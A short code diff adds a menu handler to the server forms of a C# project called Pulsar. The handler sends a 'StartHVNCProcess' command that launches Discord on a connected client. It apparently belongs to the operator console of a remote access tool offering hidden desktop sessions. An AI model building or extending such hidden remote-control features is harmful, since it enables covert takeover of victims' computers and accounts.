@@ -462,5 +462,13 @@ namespace Pulsar.Server.Forms
         {
             TogglePanelVisibility(true);
         }
+
+        private void startDiscordToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            _connectClient.Send(new StartHVNCProcess
+            {
+                Application = "Discord"
+            });
+        }
     }
 }
